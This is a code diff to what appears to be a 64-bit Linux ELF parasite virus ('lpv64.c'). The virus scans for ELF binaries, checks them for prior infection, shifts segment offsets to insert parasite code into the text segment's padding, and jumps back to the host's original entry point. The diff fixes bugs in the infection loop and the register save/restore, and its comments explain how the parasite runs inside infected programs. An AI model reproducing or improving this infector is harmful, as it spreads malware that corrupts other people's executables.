@@ -1,3 +1,4 @@
+/* gcc lpv64.c -o lpv64 -nostdlib*/
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -31,7 +32,6 @@ _start(){
 		"push %rcx\n"
 		"push %rdx\n"
 		"push %rbx\n"
-		"push %rsp\n"
 		"push %rbp\n"
 		"push %rsi\n"
 		"push %rdi\n"
@@ -39,11 +39,15 @@ _start(){
 		"pop %rdi\n"
 		"pop %rsi\n"
 		"pop %rbp\n"
-		"pop %rsp\n"
 		"pop %rbx\n"
-		"pop %rbx\n"
+		"pop %rdx\n"
 		"pop %rcx\n"
 		"pop %rax\n"
+		/* The myexit will be overlaped by the push 0Xxxxxxxxx, ret.
+		 * So when jmp myexit, in lpv will normal exit.
+		 * But in the parasited program will execute the push and ret.
+		 * And will execute the origin _start.
+		 */
 		"jmp myexit\n");
 }
 
@@ -109,13 +113,14 @@ do_main(){
 		read(fd, mem, st.st_size);
 
 		ehdr = (Elf64_Ehdr *)mem;
+		/* Should use strncmp */
 		if(ehdr->e_ident[0] != 0x7f && strcmp(&ehdr->e_ident[1], "ELF")){
 			close(fd);
 			continue;
 		} else{
 			/* Check the file has been infected*/
 			phdr = (Elf64_Phdr*)(mem + ehdr->e_phoff);
-			for(i = 0; i < ehdr->e_phentsize; phdr++, i++){
+			for(i = 0; i < ehdr->e_phnum; phdr++, i++){
 				if(phdr->p_type == PT_LOAD){
 					if(phdr->p_flags == (PF_R | PF_X)){
 						unsigned int pt = (PAGE_SIZE - 4) - parasite_size;
@@ -138,7 +143,7 @@ do_main(){
 		}
 		else{
 			phdr = (Elf64_Phdr *)(mem + ehdr->e_phoff);
-			for(i = 0; i < ehdr->e_phentsize; phdr++, i++){
+			for(i = 0; i < ehdr->e_phnum; phdr++, i++){
 				if(text_found){
 					phdr->p_offset += PAGE_SIZE;
 				} else if(phdr->p_type == PT_LOAD){
